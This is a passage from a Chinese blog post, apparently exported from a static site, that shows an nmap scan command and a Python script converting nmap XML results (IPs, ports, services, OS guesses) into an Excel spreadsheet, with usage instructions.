class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. nmap -sS 192.168.1.1 -T4 --open -n -oX test.xml</span><br></pre></td></tr></table></figure><h3 id="三、xml结果过滤"><a href="#三、xml结果过滤" class="headerlink" title="三、xml结果过滤"></a>三、xml结果过滤</h3><h5 id="1-关于xml文件解析"><a href="#1-关于xml文件解析" class="headerlink" title="1. 关于xml文件解析"></a>1. 关于xml文件解析</h5><p>  python中解析xml有四种方法，其实对于我们这些偶尔拿来吃鸡的来说，随便一个就行了<br>常用的xml.dom.minidom和xml.etree.ElementTree，其中xml.etree.ElementTree有一个C语言的实现，即xml.etree.cElementTree，听说速度会快一点。（python3.3+版本后，ElemenTree模块会自动优先使用C加速器，如果不存在C实现，则会使用Python实现）</p><h5 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2. 代码实现"></a>2. 代码实现</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET   <span class="comment">#解析xml，python3已经默认使用cElementTree</span></span><br><span class="line"><span class="keyword">import</span> xlwt     <span class="comment">#写excel</span></span><br><span class="line"><span class="keyword">import</span> argparse    <span class="comment">#运行前参数</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断运行时python版本是否小于3.x</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info.major &lt; <span class="number">3</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I need python3.x&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parsexml</span>(<span class="params">xml,sheet</span>):</span></span><br><span class="line">tree = ET.parse(xml)</span><br><span class="line">root = tree.getroot()     <span class="comment">#获取根节点</span></span><br><span class="line">hosts = root.findall(<span class="string">&quot;host&quot;</span>)</span><br><span class="line">i = <span class="number">0</span>   <span class="comment">#写入excel的计数器</span></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> hosts:</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line">portTcpRes = <span class="string">&quot;&quot;</span></span><br><span class="line">portOtherRes = <span class="string">&quot;&quot;</span></span><br><span class="line">ip = host.find(<span class="string">&quot;address&quot;</span>)</span><br><span class="line">ipaddress = ip.attrib.get(<span class="string">&#x27;addr&#x27;</span>)</span><br><span class="line"><span class="comment"># print(&quot;ip地址:&quot;+ ipaddress)</span></span><br><span class="line">ports = host.find(<span class="string">&quot;ports&quot;</span>).findall(<span class="string">&quot;port&quot;</span>)</span><br><span class="line"><span class="comment">#获取系统版本的扫描结果</span></span><br><span class="line">os = host.find(<span class="string">&quot;os&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">osmatch = os.find(<span class="string">&quot;osmatch&quot;</span>)</span><br><span class="line">osname = osmatch.attrib.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">accuracy = osmatch.attrib.get(<span class="string">&quot;accuracy&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">osname = <span class="string">&quot;&quot;</span></span><br><span class="line">accuracy = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># print(ports)</span></span><br><span class="line"><span class="keyword">for</span> portT <span class="keyword">in</span> <span class="built_in">list</span>(ports):</span><br><span class="line">service = portT.find(<span class="string">&quot;service&quot;</span>)</span><br><span class="line">protocol = portT.attrib.get(<span class="string">&#x27;protocol&#x27;</span>)</span><br><span class="line"><span class="comment">#获取nmap结果中service信息</span></span><br><span class="line">serviceName = service.attrib.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">product = service.attrib.get(<span class="string">&#x27;product&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> product:</span><br><span class="line">serviceName = serviceName + <span class="string">&#x27;:&#x27;</span> + product   <span class="comment">#将SERVICE和VERSION组合一起</span></span><br><span class="line"><span class="comment">#获取端口号</span></span><br><span class="line">portNum = portT.attrib.get(<span class="string">&#x27;portid&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> protocol == <span class="string">&#x27;tcp&#x27;</span>:</span><br><span class="line">portTcpRes += portNum + <span class="string">&#x27;(&#x27;</span> + serviceName + <span class="string">&#x27;),&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:<span class="comment">#其他协议</span></span><br><span class="line">portOtherRes += portNum + <span class="string">&#x27;(&#x27;</span> + serviceName + <span class="string">&#x27;),&#x27;</span></span><br><span class="line">output(sheet,ipaddress,portTcpRes.strip(<span class="string">&#x27;,&#x27;</span>),portOtherRes.strip(<span class="string">&#x27;,&#x27;</span>),i,osname,accuracy+<span class="string">&quot;%&quot;</span>)    <span class="comment">#写入excel</span></span><br><span class="line"><span class="comment"># print(portTcpRes.strip(&#x27;,&#x27;))</span></span><br><span class="line"><span class="comment"># print(&#x27;------------------------&#x27;)</span></span><br><span class="line"><span class="comment">#初始化excel</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">excelcsh</span>():</span></span><br><span class="line">ExcelFile = xlwt.Workbook(encoding=<span class="string">&#x27;utf-8&#x27;</span>,style_compression=<span class="number">0</span>)</span><br><span class="line">sheet1 = ExcelFile.add_sheet(<span class="string">&#x27;nmap结果&#x27;</span>)</span><br><span class="line"><span class="comment">#表格第一行</span></span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&#x27;ip地址&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;TCP端口&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;其他协议端口&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;系统版本&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">4</span>,<span class="string">&#x27;系统扫描精准度&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> ExcelFile,sheet1</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">output</span>(<span class="params">sheet,ip,tcpport,otherproto,num,osversion,accuracy</span>):</span></span><br><span class="line"><span class="comment">#写入数据</span></span><br><span class="line">sheet.write(num,<span class="number">0</span>,ip)</span><br><span class="line">sheet.write(num,<span class="number">1</span>,tcpport)</span><br><span class="line">sheet.write(num,<span class="number">2</span>,otherproto)</span><br><span class="line">sheet.write(num,<span class="number">3</span>,osversion)</span><br><span class="line">sheet.write(num,<span class="number">4</span>,accuracy)</span><br><span class="line"><span class="comment">#刷新缓存</span></span><br><span class="line">sheet.flush_row_data()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;xml解析&quot;</span>)<span class="comment">#.decode(&#x27;utf-8&#x27;).encode(&#x27;gbk&#x27;)</span></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-x&#x27;</span>,action=<span class="string">&quot;store&quot;</span>,required=<span class="literal">False</span>,dest=<span class="string">&quot;xml&quot;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,<span class="built_in">help</span>=<span class="string">&#x27;nmap result(xml file)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>,action=<span class="string">&quot;store&quot;</span>,required=<span class="literal">False</span>,dest=<span class="string">&quot;outfile&quot;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,<span class="built_in">help</span>=<span class="string">&#x27;outputName&#x27;</span>,default=<span class="string">&quot;excel.xls&quot;</span>)</span><br><span class="line"><span class="comment"># parser.add_argument(&#x27;--file&#x27;,action=&quot;store&quot;,required=False,dest=&quot;file&quot;,type=str,help=&#x27;Input filename eg:a.txt&#x27;)</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line">xml = args.xml</span><br><span class="line">outpath = args.outfile</span><br><span class="line"><span class="keyword">if</span> xml:</span><br><span class="line">excelfile,sheet = excelcsh()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">parsexml(xml,sheet)</span><br><span class="line"><span class="keyword">except</span> FileExistsError <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;xml文件不存在&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line">excelfile.save(outpath)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;文件保存至 %s&quot;</span> % outpath)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Error args&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;eg: python3 pythonXml.py -x nmap.xml -o nmap.xls&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="3-怎么用"><a href="#3-怎么用" class="headerlink" title="3. 怎么用"></a>3. 怎么用</h5><p>因为每个人的习惯都不同，写的鬼东西自己感觉方便，别人看来可能都运行不起来，所以简单说明一下<br>a. 需要安装xlwt库，命令行中运行: pip install xlwt<br>b. 需要用python3.x运行，python2的兄弟可以把 print() 改成 print ，同时把开头效验版本的if语句注释掉<br>c. python3 nmapxml2excel -x test.xml -o test.xls</p><h3 id="四、补充"><a href="#四、补充" class="headerlink" title="四、补充"></a>四、补充</h3><ol><li><p>nmap扫描端口和服务</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/2.png" alt="2"></p></li><li><p>脚本过滤</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/3.png" alt="3"></p></li><li><p>excel内容</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/4.png" alt="4"></p></li><li><p>批量结果处理</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/5.png" alt="5"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> py脚本 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
